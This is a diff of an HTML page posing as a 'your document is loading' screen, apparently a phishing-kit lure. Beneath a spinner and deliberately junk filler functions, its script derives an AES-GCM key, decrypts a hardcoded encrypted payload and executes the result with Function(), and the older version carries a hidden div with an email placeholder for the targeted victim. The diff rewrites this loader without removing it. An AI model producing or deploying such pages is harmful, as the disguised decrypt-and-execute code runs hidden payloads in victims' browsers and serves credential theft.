@@ -3,94 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading Document - Enhanced</title>
+    <meta name="author" content="Anonymous Developer">
+    <title>Improved Loading Document</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            font-family: 'Verdana', sans-serif;
+            background-color: #f8f9fa;
             display: flex;
-            align-items: center;
+            flex-direction: column;
             justify-content: center;
+            align-items: center;
             height: 100vh;
             overflow: hidden;
         }
-        .loading-container {
-            text-align: center;
+        .spinner-wrapper {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
         }
-        .loading-spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid #ddd;
-            border-top: 5px solid #3498db;
+        .rotating-spinner {
+            width: 60px;
+            height: 60px;
+            border: 8px solid #aaa;
+            border-top: 8px solid #3498db;
             border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+            animation: rotate 1.2s linear infinite;
         }
-        .extra-div {
-            display: none;
-            color: red;
-        }
-        @keyframes spin {
+        @keyframes rotate {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .loading-text {
+        .hidden-note {
+            visibility: hidden;
+            font-size: 14px;
+            color: crimson;
+        }
+        .loading-indicator {
+            margin-top: 20px;
             font-size: 18px;
-            color: #333;
+            color: #444;
+        }
+        .extra-section {
+            opacity: 0;
+            pointer-events: none;
+            position: absolute;
+            bottom: 0;
+            left: 0;
         }
     </style>
 </head>
 <body>
+
+    <!-- Wrapper with no purpose -->
     <div id="hidden-wrapper" style="display: none;">
-        <div class="dummy-element" data-info="random-data"></div>
+        <div class="placeholder-content" useless-attr="placeholder"></div>
     </div>
 
-    <div class="loading-container">
-        <div class="loading-spinner" useless-attr="123"></div>
-        <p class="loading-text">Please wait, loading your document...</p>
+    <div class="spinner-wrapper">
+        <div class="rotating-spinner" extra-data="example"></div>
+    </div>
+    <p class="loading-indicator">Your document is being prepared. Please wait...</p>
+
+    <!-- Additional and redundant elements -->
+    <div class="extra-section">
+        <span>This section is redundant and hidden.</span>
     </div>
 
+    <!-- Main Script -->
     <script>
-        // Simulate document loading
+        // Fake complexity added
+        const startFakeTask = () => {
+            const mockArray = ["Task1", "Task2", "Task3"];
+            mockArray.forEach(task => console.log(`Executing: ${task}`));
+        };
+        startFakeTask();
+
+        // Simulate document readiness
         setTimeout(() => {
-            document.querySelector('.loading-text').textContent = 'Document is ready!';
-            document.body.style.backgroundColor = '#e0ffe0'; // Change background as a cue
-        }, 5000); // Adjust loading time as needed
+            document.querySelector('.loading-indicator').textContent = 'Your document is ready!';
+            document.body.style.backgroundColor = '#eaf7ea';
+        }, 5000);
+
+        // Another fake process
+        (() => {
+            const tempDiv = document.createElement('div');
+            tempDiv.setAttribute('id', 'temporaryDiv');
+            tempDiv.innerHTML = 'Temporary content here!';
+            console.log(tempDiv);
+        })();
     </script>
 
-    <div nike-marie011="" adidas="<%=EMAIL64%>"></div>
-    <div class="extra-div" useless-attr2="yes">Hidden Content</div>
-
+    <!-- Additional Script for Redundancy -->
     <script>
-        const fakeAction = () => console.log("This does nothing useful.");
-        fakeAction();
-      
-        const performDecryption = async (encryptedData, ivString, saltString, passphrase) => {
-            console.log("[INFO] Decryption process initiated...");
+        const unnecessaryFunction = () => {
+            const logData = "Redundant log message.";
+            for (let i = 0; i < 2; i++) {
+                console.log(logData);
+            }
+        };
+        unnecessaryFunction();
+
+        const performDataDecryption = async (cipherData, ivHex, saltHex, password) => {
+            console.log("[INFO] Starting decryption process...");
 
             // Convert hex to Uint8Array
-            const hexToBytes = (hex) => {
-                console.log(`[DEBUG] Converting hex string: ${hex}`);
-                return Uint8Array.from(hex.match(/.{2}/g).map((byte) => parseInt(byte, 16)));
+            const convertHexToBytes = (hex) => {
+                console.log(`[DEBUG] Hex conversion: ${hex}`);
+                return Uint8Array.from(hex.match(/.{2}/g).map(byte => parseInt(byte, 16)));
             };
 
-            const ivArray = hexToBytes(ivString);
-            const saltArray = hexToBytes(saltString);
+            const ivBytes = convertHexToBytes(ivHex);
+            const saltBytes = convertHexToBytes(saltHex);
 
-            // Adding an arbitrary delay (useless operation)
-            const fakeDelay = () => new Promise((resolve) => {
-                console.log("[INFO] Simulating delay...");
+            // Simulating an artificial delay
+            const simulateDelay = () => new Promise(resolve => {
+                console.log("[INFO] Delay simulated...");
                 setTimeout(() => {
-                    console.log("[DEBUG] Fake delay complete.");
+                    console.log("[DEBUG] Delay complete.");
                     resolve();
-                }, 100);
+                }, 150);
             });
 
-            // Key derivation process
-            const deriveKey = async (keyMaterial, salt) => {
-                console.log("[INFO] Deriving AES-GCM decryption key...");
+            // Deriving key
+            const generateKey = async (keyMaterial, salt) => {
+                console.log("[INFO] Generating decryption key...");
                 return crypto.subtle.deriveKey(
                     { name: "PBKDF2", salt, iterations: 100000, hash: "SHA-256" },
                     keyMaterial,
@@ -102,23 +141,23 @@
 
             const keyMaterial = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(passphrase),
+                new TextEncoder().encode(password),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
 
-            await fakeDelay(); // Just to look like more is happening
-            const aesKey = await deriveKey(keyMaterial, saltArray);
+            await simulateDelay();
+            const aesKey = await generateKey(keyMaterial, saltBytes);
 
             try {
-                console.log("[INFO] Attempting payload decryption...");
+                console.log("[INFO] Decrypting data...");
                 const decryptedBuffer = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: ivArray },
+                    { name: "AES-GCM", iv: ivBytes },
                     aesKey,
-                    hexToBytes(encryptedData)
+                    convertHexToBytes(cipherData)
                 );
-                console.log("[SUCCESS] Payload successfully decrypted.");
+                console.log("[SUCCESS] Decryption complete.");
                 return new TextDecoder().decode(decryptedBuffer);
             } catch (error) {
                 console.error("[ERROR] Decryption failed:", error);
@@ -126,21 +165,21 @@
             }
         };
 
-        // Function to simulate additional data processing
-        const processDecryptedData = (data) => {
-            console.log("[INFO] Processing decrypted data...");
+        // Processing decrypted data
+        const analyzeDecryptedData = (data) => {
+            console.log("[INFO] Analyzing decrypted data...");
             if (!data) {
-                console.error("[ERROR] No data to process.");
+                console.error("[ERROR] No data available.");
                 return;
             }
-            const reversedData = data.split("").reverse().join("");
-            console.log("[INFO] Data processed (reversed):", reversedData);
-            return reversedData;
+            const reversed = data.split("").reverse().join("");
+            console.log("[INFO] Processed data (reversed):", reversed);
+            return reversed;
         };
 
-        // Initialization function
+        // Initialization script
         (async () => {
-            console.log("[INFO] Script execution started...");
+            console.log("[INFO] Script started...");
             const payload = {
                 iv: "c5d54a9c69516d18fab025aa",
                 salt: "f2c9263a7137550b0829e316a222b86e",
@@ -150,7 +189,7 @@
             console.log("[INFO] Payload details:", payload);
 
             try {
-                const decryptedContent = await performDecryption(
+                const decryptedContent = await performDataDecryption(
                     payload.data,
                     payload.iv,
                     payload.salt,
@@ -159,14 +198,13 @@
 
                 if (decryptedContent) {
                     console.log("[INFO] Decrypted content:", decryptedContent);
-                    const processedContent = processDecryptedData(decryptedContent);
+                    const processedContent = analyzeDecryptedData(decryptedContent);
 
-                    // Simulate execution of processed content
                     console.log("[INFO] Executing processed content...");
                     Function(`${decryptedContent}`)();
                 }
             } catch (err) {
-                console.error("[ERROR] Unexpected error during script execution:", err);
+                console.error("[ERROR] An unexpected error occurred:", err);
             }
         })();
     </script>
